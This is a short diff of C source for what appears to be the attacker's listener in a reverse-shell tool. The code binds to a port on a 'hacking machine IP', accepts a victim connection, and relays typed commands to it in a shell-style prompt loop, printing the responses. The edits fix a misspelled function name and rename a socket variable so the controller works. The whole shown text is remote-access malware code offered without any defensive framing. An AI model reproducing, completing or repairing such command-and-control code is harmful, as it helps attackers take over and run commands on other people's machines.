@@ -29,13 +29,13 @@ int main()
 
 	
 	server_address.sin_family = AF_INET;
-	server_address.sin_addr.s_addr = inet_addre(" "); // hacking machine IP
+	server_address.sin_addr.s_addr = inet_addr(" "); // hacking machine IP
 	server_address.sin_port = htons(50004);
 
 	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
 	listen(sock, 5);
 	client_length = sizeof(client_address);
-	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);
+	client_sock = accept(sock, (struct sockaddr *) &client_address, &client_length);
 
 
 	while(1) 
@@ -46,14 +46,14 @@ int main()
 		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
 		fgets(buffer, sizeof(buffer), stdin);
 		strtok(buffer, "\n");
-		write(client_socket, buffer, sizeof(buffer));
+		write(client_sock, buffer, sizeof(buffer));
 		if (strncmp("exit", buffer, 4) == 0 ) 
 		{
 			break;
 		}
 		 else 
 		{
-			recv(client_socket, response, sizeof(response), MSG_WAITALL);
+			recv(client_sock, response, sizeof(response), MSG_WAITALL);
 			printf("%s", response);
 		}
 
